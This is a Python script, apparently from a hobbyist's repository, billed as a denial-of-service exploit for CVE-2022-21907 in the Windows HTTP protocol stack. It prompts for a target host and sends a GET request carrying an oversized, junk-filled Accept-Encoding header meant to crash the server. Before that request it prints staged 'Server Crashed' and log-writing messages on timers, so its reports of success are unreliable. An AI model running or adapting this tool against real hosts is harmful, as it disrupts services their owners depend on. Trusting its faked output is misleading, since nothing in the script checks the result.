from colorama import init, Fore, Back, Style
init(convert=True)
import requests
import time
import os

os.system('title jstDoS - CVE-2022-21907')

def limpiarConsola():
    os.system('cls')

# COLOURS

red = Fore.RED
lred = Fore.LIGHTRED_EX
black = Fore.BLACK
lblack = Fore.LIGHTBLACK_EX
white = Fore.WHITE
lwhite = Fore.LIGHTWHITE_EX
green = Fore.GREEN
lgreen = Fore.LIGHTGREEN_EX
cyan = Fore.CYAN
lcyan = Fore.LIGHTCYAN_EX
magenta = Fore.MAGENTA
lmagenta = Fore.LIGHTMAGENTA_EX
yellow = Fore.YELLOW
lyellow = Fore.LIGHTYELLOW_EX
blue = Fore.BLUE
lblue = Fore.LIGHTBLUE_EX
reset = Fore.RESET

# PRINTS

banner = rf"""

{red}          _____                    _____                _____          
{red}         /\    \                  /\    \              /\    \         {lred}best 2022 DoS exploit
{red}        /::\    \                /::\    \            /::\    \        {lred}dev by kaydy#0001
{red}        \:::\    \              /::::\    \           \:::\    \       
{red}         \:::\    \            /::::::\    \           \:::\    \      {lred}github.com/apolo1337
{red}          \:::\    \          /:::/\:::\    \           \:::\    \     
{yellow}           \:::\    \        /:::/__\:::\    \           \:::\    \    {lred}This script is based
{yellow}           /::::\    \       \:::\   \:::\    \          /::::\    \   {lred}in a HTTP Protocol Stack Remote
{yellow}  _____   /::::::\    \    ___\:::\   \:::\    \        /::::::\    \  {lred}Code Execution Vuln{red} [CVE-2022-21907]
{yellow} /\    \ /:::/\:::\    \  /\   \:::\   \:::\    \      /:::/\:::\    \ 
{yellow}/::\    /:::/  \:::\____\/::\   \:::\   \:::\____\    /:::/  \:::\____\ 
{yellow}\:::\  /:::/    \::/    /\:::\   \:::\   \::/    /   /:::/    \::/    /
{yellow} \:::\/:::/    / \/____/  \:::\   \:::\   \/____/   /:::/    / \/____/ 
{red}  \::::::/    /            \:::\   \:::\    \      /:::/    /          
{red}   \::::/    /              \:::\   \:::\____\    /:::/    /           
{red}    \::/    /                \:::\  /:::/    /    \::/    /            
{red}     \/____/                  \:::\/:::/    /      \/____/             
{red}                               \::::::/    /                           
{red}                                \::::/    /                            
{red}                                 \::/    /                             
{red}                                  \/____/                              
                                                                       

"""

# PRINTS

# CODE

print(banner)
print(lmagenta +"Type the host (ex. 1.1.1.1)\n")
print(Style.RESET_ALL)

print(Fore.YELLOW)
host = input()
print(Style.RESET_ALL)

limpiarConsola()
print(banner)
print(lmagenta +"Starting exploit to " + host)
print(Style.RESET_ALL)
time.sleep(5)

limpiarConsola()
print(banner)
print(lmagenta +"Server Crashed")
time.sleep(1.5)
print(lmagenta +"Writing log.")
time.sleep(0.5)
limpiarConsola()
print(banner)
print(lmagenta +"Server Crashed")
print(lmagenta +"Writing log..")
time.sleep(0.5)
limpiarConsola()
print(banner)
print(lmagenta +"Server Crashed")
print(lmagenta +"Writing log...")

# jstDoS Exploit REQUEST

print(Fore.GREEN)
jstDoS = requests.get(f'http://{host}/', headers = {'Accept-Encoding':
'AAAAAAAAAAAAAAAAAAAAAAAA,\
BBBBBBcccACCCACACATTATTATAASDFADFAFSDDAHJSKSKKSKKSKJHHSHHHAY&AU&**SISODDJJDJJDJJJDJJSU**S,\
RRARRARYYYATTATTTTATTATTATSHHSGGUGFURYTIUHSLKJLKJMNLSJLJLJSLJJLJLKJHJVHGF,\
TTYCTCTTTCGFDSGAHDTUYGKJHJLKJHGFUTYREYUTIYOUPIOOLPLMKNLIJOPKOLPKOPJLKOP,\
OOOAOAOOOAOOAOOOAOOOAOOOAOO,\
****************************jstDoS, *, ,',})